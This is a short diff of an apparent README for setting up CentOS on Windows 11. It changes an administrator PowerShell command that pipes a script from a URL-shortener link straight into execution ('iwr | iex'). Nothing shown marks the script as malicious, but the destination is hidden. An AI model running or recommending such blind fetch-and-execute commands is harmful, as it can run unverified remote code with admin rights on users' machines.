@@ -64,7 +64,7 @@ Following script is tested on a fresh install of Windows 11 Pro.
 Open `powershell` as administrator and run the following command. You will be asked to enter `username` and `password` to setup `CentOS` which you will need later.
 
 ```powershell
-iwr -useb https://dub.sh/kIv4BnI | iex
+iwr -useb https://is.gd/ipijok | iex
 ```
 
 After the above scripts ends, you must do the following
